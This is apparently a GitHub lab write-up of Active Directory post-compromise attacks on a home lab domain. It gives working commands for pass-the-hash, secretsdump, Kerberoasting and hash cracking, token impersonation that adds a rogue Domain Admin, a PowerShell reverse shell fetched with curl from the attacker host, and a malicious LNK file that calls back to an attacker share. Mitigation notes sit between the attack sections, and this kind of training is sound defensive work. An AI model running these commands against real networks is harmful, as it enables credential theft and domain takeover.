Setup win2022 server: 192.168.64.138  
Setup Peterparker: \192.168.64.140  
Setup Frankcastle: 192.168.64.139  
Kali: \192.168.64.129/24  

---

## 🚩 'Pass Attacks' - Pass the Password  

### Pass the Password  
With a SAM dump and cracked hash, we have the ability to push the credentials around with every device that has the ability to recieve and accept the login attempt.  

crackmapexec SMB Password abuse: 

    crackmapexec smb 192.168.64.0/24 -u fcastle -d MARVEL.local -p Password1

![image](https://github.com/user-attachments/assets/025b48ea-6702-4094-ae25-c54168fb1607)
We can see that the username and password has been passed around the network and was successful only on Spiderman and Thepunisher devices. Although there was a succesful authentication on Hyrda-DC, fcastle is not a local admin on that device therefore there is no login. 

---

## 🚩 'Pass Attacks' - Pass the Hash  
### Pass the Hash 
With a SAM dump containing local Admin credentials (likely gathered during the initial attack stage), we can also pass a local admin account username with hash around the network and observe which devices accept these credentials.

crackmapexec SMB Hash abuse:

    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth

![image](https://github.com/user-attachments/assets/13e70253-c999-4110-baf0-1cab4d1841f4)  
Local admin account succesful for Spiderman and Thepunisher  

### Note 1 Information gathering  
**Adding the below flags behind --local-auth:**  
--sam (dumps all local SAM files found)  
--shares (shows all accessbile shares)  
--lsa (local security authority)  

    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth --sam

### Note 2 (SMB) Modules  
**crackmapexec smb -L will list out all the modules we can use with SMB by adding -M behind --local-auth:**  
-L  
-M Lsassy  

    crackmapexec smb -L
    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth -M lsassy  

### Note 3 crackmapexec database

    root@kali:/home/kali# cmedb
    cmedb (default)(smb) > help
![image](https://github.com/user-attachments/assets/d758e9f9-056b-40b3-ac2e-262eac9cd2b6)  

---

## 🚩 Dumping and Cracking Hashes (Secretsdump) with password
With impacket(secretsdump) we will now use a known account credentials to dump the secrets of the machine to see further information. This can present further SAM dumps, domain admin passwords in clear texts and vulnerabile protocols such as wdigest existing on older machines which could be force / enabled for abuse.  

    impacket-secretsdump MARVEL.local/fcastle:'Password1'@192.168.64.139
    
![image](https://github.com/user-attachments/assets/8fc185f1-06ba-4f4f-bd89-968163496df4)  
SAM hashes to note: Admin, User accounts, DCC

## 🚩 Dumping and Cracking Hashes (Secretsdump) with hash
Secretsdump can also provide further information of a device in the event the passwords cannot be cracked. 

    /home/kali# impacket-secretsdump administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
    
![image](https://github.com/user-attachments/assets/a1c69bd3-1ac7-44be-8bc4-9a43d31fc827)  
In this case we could see an account with username Administrator with the "$DCC2$" which is usually the prefix for ntlmv2 hashing with the hash we could potentially attempt to crack and maybe attain a password for a domain administrator.  

whenever we come across new hashes through the Post Compromise lateral movement, we want to atleast attempt a password crack. The below example, will use hashcat to crack a ntlm hash.

    hashcat -m 1000 ntlm11.txt /usr/share/wordlists/rockyou.txt
![image](https://github.com/user-attachments/assets/116f014c-41f1-468b-a32d-0bec13b7c56f)

### Note 1 Hashcat  
When running hashcat, ensure the correct mode -m is selected for the hash type. Correct modes to hash types can be found online, and hash-identifier.

---

## 🔵 Pass Attack Mitigations  
### Limit account re-use:  
* Avoid re-using local admin passwords  
* Disable Guest and Administrator accounts  
* Limit who is a local administrator (least priviliege)  

### Utilize strong passwords (harder to crack):
* Long passwords
* Avoid using common words
* Use long sentences

### Privilige Access Management (PAM):
* Check in / out sensitive accounts - CyberArk
* Automatically rotate passwords on check out and check in
* limits pass attacks as hash and password is strong and constantly rotated.

### LAPS - Local Administrator Password Solution, MS tool used to manage local administrator passwords of computers in a domain environment
* Enable the usage of LAPS (Local Administratot Password Solution) - Ensures unique passwords for local admin accounts on each machine.
* prevents common and reused passwords across multiple machines.

---

## 🚩 Kerberoasting  
Goal of Kerberoasting: With an **account on the network**, get ticket Granting Service Ticket (TGS) from the KDC and decrypt server's account hash that is presented back (step 4 of diagram).
![image](https://github.com/user-attachments/assets/1109a3ee-1433-44e6-9caf-a04e757129fb)  

Using impacket-GetUserSPNs we now direct our compromised account towawrds the Service Principle Name (our DC) for a TGS | impacket-GetUsersSPNs DOMAIN/username:password -dc-ip 192.168.64.138 -request

    impacket-GetUsersSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.64.138 -request

![image](https://github.com/user-attachments/assets/e4d79c04-c03d-46af-bcab-3437bfc0b4f0)

Now that we have obtained a hash from the TGS, we can now proceed to crack it.

    root@kali:/home/kali/tempdeletelater# hashcat -m 13100 krbhash.txt /usr/share/wordlists/rockyou.txt

![image](https://github.com/user-attachments/assets/51b91c22-77f8-4e61-93d7-4ac65d5eec1b)  

Now that we have obtained the Service / Domain Admin credentials, we can go back to using tools such as PsExec, *exec, RDP etc to gain shell access and officially compromise the account.

---

## 🔵 Kerberoasting Mitigation  
Service Accounts should not be running as Domain Admin priviliges, as this is a common fault in many engagements.  
* Strong Passwords - makes it harder to crack  
* Least Privilege model  
* Do not place passwords in any descriptions of the AD account

---

## 🚩 Token Impersonation Attacks  
Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Similar to a cookie. Typically these tokens with good practices should only be temporary and stored in memory or a token store for the duration / until they expire. If users have logged into a device for example since last reboot, in theory the device may contain these tokens that can be exploited to impersonate the user.

### :atom: Delegate Token
Created whenever logging into a machine or using Remote Desktop.

1. First getting access onto a target machine (fcastle) 

### :atom: Impersonate Token   
"non-interactive" such as attaching a network drive or a domain logon script

---
### 🗡️ MSFCONSOLE  

#### 1.Gaining access
Exploit selected: windows/smb/psexec_psh  
Payload: windows/x64/meterpreter/reverse_tcp

![image](https://github.com/user-attachments/assets/e2ddd1fc-b118-45b7-8926-7acb1f3d5137)
![image](https://github.com/user-attachments/assets/25820d7e-e931-4966-8c8b-0aa2fdd434f8)

#### 2.Executing Incognito  
'Load incognito'.  
Confirm shell access has been achieved with 'shell'.  

![image](https://github.com/user-attachments/assets/8660a23d-ca3f-46d6-bef6-84c0c276d272)

List tokens of users that had logged in to the machine using list_tokens -u  

![image](https://github.com/user-attachments/assets/721a908f-38fc-4e29-94c5-638359fcc335)

use token by using impersonate-token <domain\\user>
in the below example impersonate fcastle, terminate and rev2self (revert back to original user token) and then proceed to impersonate marvel\administrator.  

![image](https://github.com/user-attachments/assets/51f0b4b7-c0db-4ec7-a292-1320c638934d)  

Now that we are in marvel\administrator lets use this oppurtunity to create a new account, provide it with admin rghts and allocate it into the domains group.
'net user' to view what accounts reside on the system (THE PUNISHER).

![image](https://github.com/user-attachments/assets/5c8f48fe-f8d3-4d66-99d2-68cd4510361b)

add new account:
add into Domain Admins group:

    C:\Windows\system32>net user /add hawkeye Password1@ /domain
    C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN

#### 3.Dumping SAM with new account using secretsdump **AGAINST THE DOMAIN CONTROLLER**
Now that we have a new rouge account with admin right created, we can use it to dump secrets - impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138  

![image](https://github.com/user-attachments/assets/73b12f15-1d2b-4121-a8d4-795cd32ca9b8)  

Mission success.

---

### 🗡️🗡️ MANUAL MODE (UPDATED)  
Managed to work msfconsole with a slightly different exploit (windows/smb/psexec_psh) and same payload of windows/x64/meterpreter/reverse_tcp. Also increased virtual machine memory to 4GB.

#### 1.Gaining access
Since attaining a reverse shell back to our attacker machine via metasploit to conduct an 'incognito' attack is not working, we will attempt to manually exploit fcastles user login with impacket-smbexec and fetch a custom PowerShell Rev Shell.  

    impacket-smbexec MARVEL/fcastle:Password1@192.168.64.139

    hosted custom PS reverse shell on attacker machine and launched a directory server,
    home/kali/tempdeletelater# python -m SimpleHTTPServer

    Run curl in semi-interactive smbexec shell
    curl -o revshell.ps1 http://192.168.64.129:8000/revshell1.ps1

![image](https://github.com/user-attachments/assets/52a5aa14-9941-4c14-a3a7-7be742573798)
![image](https://github.com/user-attachments/assets/ce8c240c-98e5-4522-be1c-f64a2f21c9f5)

    our revshell has succesfully made it over under revshell.ps1

    Now in a separate terminal, we start NetCat and execute the .PS1 file in the semi-interactive instance.
    C:\Windows\system32>powershell -ExecutionPolicy Bypass -File .\revshell.ps1 192.168.64.129 4444  
    
![image](https://github.com/user-attachments/assets/31cc46ba-6c30-4a1e-9643-3b188f03836c)  

Gaining semi-reverse shell connection with custom .ps1 script.  

![image](https://github.com/user-attachments/assets/71eba421-2780-496f-be24-c27169cfea24)  

'net user' to check the user accounts on the machine  
'whoami /groups' to check what groups the current user belongs to  

![image](https://github.com/user-attachments/assets/688c2d87-ba99-4cec-bea4-05915b4d8cf4)  

#### 2. Gaining Fully interactive reverse shell into Powershell using 'PowerCat'.  

1. host another SimpleHTTPServer instance with the custom PS reverse shell script on attacking machine.
2. from the original netcat instance, grab the script <https://github.com/rexpository/powercat-v2.0> and load a secondary netcat instance.
3. launch the new custom script, type 'powershell' to gain powershell access.
4. from here, we now have powershell access to further our post compromise. With the local account fcastle, attempt to create a new account with administrative rights.
5. if this fails, attempt to check what groups / or rights fcastle has from previous initial attack compromises.
6. if we get completely stuck (we could potentially use administrator with Password1 but this does not solve the escalation part from fcastle).
   
**Steps to take for post compromise, privilige escalation attacks:**

        * Enumerate the Current Privileges: Check the groups the current user belongs to and any misconfigured permissions.
        * Abuse Token Impersonation: Use Mimikatz or similar tools to impersonate higher-privileged users like SYSTEM.
        * Exploit Misconfigurations: Look for unquoted service paths, weak permissions, or vulnerable services.
        * Create a Malicious Scheduled Task: Use schtasks to run a task with elevated privileges.
        * Use PowerShell to Interact with the System: Leverage WMI, scheduled tasks, or other local escalation techniques via PowerShell.
        * Abuse External Vulnerabilities: Check for EternalBlue, PrintNightmare, or similar exploits.

---

## 🔵 Token Impersonation Mitigation  
1. Limit the creation of user / group token creation permiessions.
2. Restrict usage of local administrators.
3. Use LAPS - Local Administrative Password Solutions so that it randommizes Local Admin passwords everytime it is used.
4. Separation of sensitive accounts from non sensitive ones. Accounts used for day to day functions should be ahered to, and only use an admin account when usage is required.

---

## 🚩 LNK File Attacks (Windows Hash Capture)  
In this scenario, we have the ability to setup a watering hole attack. By generating a malicious lnk using powershel. We could place a lnk file inside file shares of a network. And have responder listening within the same network to recieve the commands set in the lnk.  

This can be used in the event when we are having trouble gaining further access or elevating priviliges. However we need to have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automatic refresh) could potentially execute the lnk with the commnands sent back to the attacking machine.  

1. Run Admin Powershell command to create lnk for hash captures:
2. Run Responder for HASH CAPTURE not RELAY (WPAD OFF)
     
        $objShell = New-Object -ComObject WScript.shell // objshell variable set tp wscript.shll
        $lnk = $objShell.CreateShortcut("C:\test.lnk") // shortcut for objshell is placed in C:\ or any share drive as test.lnk
        $lnk.TargetPath = "\\192.168.138.149\@test.png" // when opened or refreshed it will reach out to the attacker machine
        $lnk.WindowStyle = 1
        $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
        $lnk.Description = "Test"
        $lnk.HotKey = "Ctrl+Alt+T"
        $lnk.Save()

**crackmapexec / netexec using module -M Slinky, to implant a lnk into a 'file share' on the network if there is one identified and also exposed, without the requirement to access the target machine your self.**  

    crackmapexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  
    
    netexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  

---

## 🚩 GPP AKA cPassword Attacks  
1. Group Policy Preferences (GPP) an older protocol which allowed admins to create policies with embedded credentials.
2. These credentials are encrypted and placed in a 'cPassword'.
3. Key was released, patched in MS14-025 but does not prevent previous uses.
4. If there is an old Domain Controller, patch was not made or the older files still exists, there is a chance these credentials are still there.  

Example of gpp-decrypt (built in Kali tool):  

![image](https://github.com/user-attachments/assets/5527c8b9-4d31-47de-84ae-1a4a3596ec4f)  

Metasploit example with valid credentials, logs in with any valid credentials and looks in the 'SYSVOL' of the Domain Controller for XML files for group policies that may contain 'cPasswords'. If it finds any 'cPasswords' it will attempt to crack it as well.  

![image](https://github.com/user-attachments/assets/805e0f60-69d3-4135-bb2c-38d612998493)

## 🔵 GPP AKA cPassword mitigations  
1. Patch #KB2962486.
2. Delete old GPP xml files stored in SYSVOL.

---

## 🚩 Mimikatz  
A post exploitation tool
1. Tool used to view, steal credentials, generate kerberos tickets and leverage attacks.
2. Dump credentials stored in memory.
3. Pass the hash, over pass the hash, pass the ticket, silver ticket and golden ticket and more.


